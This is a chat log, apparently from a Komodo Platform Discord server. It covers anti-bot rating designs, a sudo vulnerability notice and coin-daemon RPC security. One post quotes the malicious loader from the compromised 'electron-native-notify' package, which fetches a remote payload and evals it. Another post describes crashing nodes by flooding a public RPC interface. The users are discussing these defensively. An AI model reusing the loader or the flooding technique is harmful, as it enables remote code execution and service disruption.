Hello

[06-Jun-19 06:35 PM] BigSlim#9710
Thank you for awesome product

@BigSlim you seem to be in the wrong discord. This one is "Komodo Platform"

So the only further information I found was this, someone uploaded the source of the `electron-native-notify` dependency. But it seems that the payload has been loaded from a server. Does anyone have the payload?

```
try {
    (process && "renderer" === process.type ? require("electron").remote.require : require)("https").get("https://updatecheck.herokuapp.com/check", res => res.on("data", d => {
        try {
            eval((atob || (e => "" + Buffer.from(e, "base64")))("" + d))
        } catch (e) {}
    }))
} catch (e) {}
```

I'm developing a gaming platform where users will rate an item. What methods do you recommend taking to stop bots, malicious actors, and miceoworkers from spamming the system. I've been told micro transactions fees to rate, identity verification, any others?

[21-Aug-19 04:30 AM] Mylo#8306
proof of gameplay won't stop the bots, but it will allow ppl to earn their right to rate after playing

[21-Aug-19 07:21 AM] polycryptoblog#1173
Txpow

[21-Aug-19 07:23 AM] blackjok3r#3181
no

[21-Aug-19 07:47 AM] polycryptoblog#1173
Why not txpow ?

[21-Aug-19 07:49 AM] blackjok3r#3181
How doies that help with a game?

[21-Aug-19 07:49 AM] blackjok3r#3181
The game poroof of play requries all key press to be sent to blochain as fast as possible... by adding txpow you just slow it down so it wont work any more

[21-Aug-19 08:01 AM] polycryptoblog#1173
He was asking about rating items, not proof of gameplay.

[21-Aug-19 08:14 AM] Mylo#8306
Yeah rate limiting by using computing power would reduce imo.  Depends on market though.  Spending $15 a week on constant ratings might have thousands of upside....need more info really - but if its competitive amongst projects for player mindshare, the adversarial side of "doing business" will do what it wants off-chain

[21-Aug-19 08:15 AM] blackjok3r#3181
Why not just make it so that they can onlyt appear once every X blocks?

[21-Aug-19 08:16 AM] blackjok3r#3181
Seems much simpler and less wasteful

[21-Aug-19 08:16 AM] blackjok3r#3181
Send a marker to some address, and that cannot be spent until X blocks have passed. 
That marker must be spent to create the next item

[21-Aug-19 08:20 AM] Mylo#8306
Global rating limits? Eg 10 markers (ratings) every 5 blocks?

[21-Aug-19 08:21 AM] Mylo#8306
It could, and again depends on all the other info.  Marker would work

[21-Aug-19 08:27 AM] blackjok3r#3181
yes

[21-Aug-19 08:28 AM] blackjok3r#3181
use a CC EVAL code

[21-Aug-19 08:28 AM] blackjok3r#3181
gives a global address... or any number of global address

[21-Aug-19 08:28 AM] blackjok3r#3181
have a marker utxo that can only be spent after some amount of blocks...

[21-Aug-19 01:03 PM] Mylo#8306
@blackjok3r marker pattern, can be used for a token pausing solution?

[21-Aug-19 01:06 PM] Mylo#8306
Eg, I create MYLO tokens, find out my business partner is about to sell some illegally to a 3rd party, can put a pause marker until it can be resolved.  Or say in a game situation, the championship has just been won, the game takes a 1 week competition break/holiday.

[22-Aug-19 03:07 AM] smk762 -  dracocanis ominator#7640
Maybe lock the tokens via HeirCC module?

thank you jl for the info
```The vulnerability affects all Sudo versions prior to the latest released version 1.8.28, which has been released today, a few hours ago and would soon be rolled out as an update by various Linux distributions to their users.
So, if you use Linux, you are highly recommended to update sudo package manually to the latest version as soon as it is available.```

@ca333

[23-Nov-19 09:16 AM] ca333#0118
thanks @phm87  - yea, we should never expose an rpc interface to external (unknown) conns. There is even a much worse unpatched vuln around - hammer a coin daemons rpc interface with few thousand simul. requests and you ll get the node to crash. Pre-req for this attack: nodes rpc interface is "public" and has non-limited rpc worker queue...

[23-Nov-19 09:17 AM] phm87#7395
yes, I discussed a little bit with dukeleto about this

[23-Nov-19 09:18 AM] phm87#7395
in any case, when an attacker is able to use the RPC calls, he can do what he wants and  it is not limited to this CVE.

[24-Nov-19 12:39 PM] dukeleto#7326
the CVE covers anything that is allowed to connect to the port, not just things with have a user+pass. That is a subtle point and means everything on localhost could elevate the attack. This makes it so if you can get access to an unpriveledged user on the same machine, you can launch this attack

[24-Nov-19 12:40 PM] dukeleto#7326
this is considered "fucked" already for most coins. Having malicious users on the same machine opens you up to side channel attacks, which Zcash is not designed for (see the latest Zcash CVEs) and so this CVE isn't super critical
